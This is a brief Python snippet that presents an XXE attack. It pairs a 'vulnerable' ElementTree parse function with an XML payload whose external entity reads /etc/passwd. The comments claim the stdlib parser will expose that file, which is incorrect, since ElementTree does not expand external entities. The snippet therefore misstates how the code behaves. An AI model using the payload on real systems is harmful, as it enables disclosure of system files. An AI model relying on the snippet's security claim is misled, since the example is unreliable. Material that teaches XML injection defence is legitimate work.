import xml.etree.ElementTree as ET

def parse_xml(xml_string):
    # Vulnerable code allowing external entities
    return ET.fromstring(xml_string)

# Example XML input that could exploit the vulnerability
xml_input = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>"""

# This would allow an attacker to read the /etc/passwd file
result = parse_xml(xml_input)
print(result)